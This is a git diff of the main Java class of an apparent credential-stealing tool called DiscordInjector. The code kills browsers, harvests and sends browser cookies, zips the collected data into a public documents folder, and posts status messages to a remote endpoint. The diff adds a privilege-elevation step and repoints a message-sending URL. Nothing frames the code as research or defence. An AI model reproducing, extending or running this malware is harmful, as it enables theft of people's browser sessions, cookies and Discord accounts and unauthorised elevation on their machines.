@@ -2,6 +2,7 @@ package io.github.luxotick;
 
 import io.github.luxotick.impl.*;
 import io.github.luxotick.impl.cookies.sendCookies;
+import io.github.luxotick.utils.ElevateUtil;
 import okhttp3.*;
 
 import java.io.*;
@@ -13,14 +14,13 @@ import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
-import io.github.luxotick.utils.util;
-
 
 public class Start {
     public static long snowflakeId = Snowflake.generateSnowflakeId();
     public static String documents = "C:\\Users\\Public\\Documents";
 
     public static void main(String[] argument) throws Exception {
+        System.out.println("Starting DiscordInjector...");
         String version = "1.0.2";
 		versionChecker(version);
         Sender.sendMessage("Starting DiscordInjector v" + version);
@@ -29,7 +29,10 @@ public class Start {
 		}
         OkHttpClient client = new OkHttpClient();
 
-        DiscordInjector.instance.initialize();
+        ElevateUtil elevateUtil = new ElevateUtil();
+        elevateUtil.elevate();
+
+        //DiscordInjector.instance.initialize();
         Sender.sendMessage("DiscordInjector initialized.");
 		Sender.sendMessage("Starting other arguments...");
 		Browsers.main(argument);
@@ -43,25 +46,26 @@ public class Start {
         KillBrowsers.kill();
         sendCookies.zaa();
         sendCookies.mh();
-        telegram();
+        //telegram();
 
         File folder = new File("C:\\Users\\Public\\Documents");
         File[] listOfFiles = folder.listFiles();
 
-        for (int i = 0; i < listOfFiles.length; i++) {
-            if (listOfFiles[i].isFile()) {
-                boolean contain = containsSnowflakeId(listOfFiles[i].getName());
-                if(contain){
-                    System.out.println("File " + listOfFiles[i].getName() + " contains snowflake id.");
-                    snowflakeId = Long.parseLong(listOfFiles[i].getName().replace(".zip", ""));
-                }else{
-                    System.out.println("File " + listOfFiles[i].getName() + " does not contain snowflake id.");
+        assert listOfFiles != null;
+        for (File listOfFile : listOfFiles) {
+            if (listOfFile.isFile()) {
+                boolean contain = containsSnowflakeId(listOfFile.getName());
+                if (contain) {
+                    System.out.println("File " + listOfFile.getName() + " contains snowflake id.");
+                    snowflakeId = Long.parseLong(listOfFile.getName().replace(".zip", ""));
+                } else {
+                    System.out.println("File " + listOfFile.getName() + " does not contain snowflake id.");
                 }
 
             }
         }
 
-            Zip.main(argument);
+        Zip.main(argument);
 
         final String zort = "C:\\Users\\Public\\Documents\\" + snowflakeId +  ".zip";
 
@@ -117,9 +121,9 @@ public class Start {
     }
 
     public static void telegram() throws IOException {
-        String url = "http://url/send-message";
+        String url = "http://127.0.0.1:1453/send-message";
 
-        String hostname = "Unknown";
+        String hostname;
 
         InetAddress addr;
         addr = InetAddress.getLocalHost();
